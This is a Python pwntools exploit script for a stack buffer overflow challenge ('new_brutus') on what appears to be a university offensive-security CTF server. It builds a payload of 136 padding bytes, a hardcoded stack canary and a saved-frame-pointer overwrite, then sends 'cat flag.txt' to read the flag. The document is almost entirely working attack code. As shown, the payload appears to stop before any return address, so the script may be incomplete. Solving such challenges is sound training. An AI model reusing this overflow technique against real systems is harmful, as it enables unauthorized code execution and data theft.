#import from py
import re

#outside imports
from pwn import *

PADDING = 136
canary = [0x00, 0xd1, 0x3b, 0x71, 0x9c, 0x1e, 0x87, 0xc8]

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1340
netid='pk1898'


do_remote = True
binary_name = './new_brutus'

#for doing local debugging
is_local_dbg = False
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x0040071A
b give_shell
c
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def gen_buffer():
    e = ELF(binary_name)
    DATA = ''
    DATA = "A" * PADDING
    DATA += struct.pack("B", canary[0])
    DATA += struct.pack("B", canary[1])
    DATA += struct.pack("B", canary[2])
    DATA += struct.pack("B", canary[3])
    DATA += struct.pack("B", canary[4])
    DATA += struct.pack("B", canary[5])
    DATA += struct.pack("B", canary[6])
    DATA += struct.pack("B", canary[7])
    DATA += "B" * 8  # pop RBP
    return DATA


def solve(target):
    for x in range(3):
        print 'discarded: %s' % target.readline()
    size = str(PADDING + 8 + 8 + 4)
    print target.sendline(size)
    print target.readline()
    print target.sendline(gen_buffer())
    print target.readline()
    print target.sendline('cat flag.txt')
    return target.readline()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = find_flag(solve(p))
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
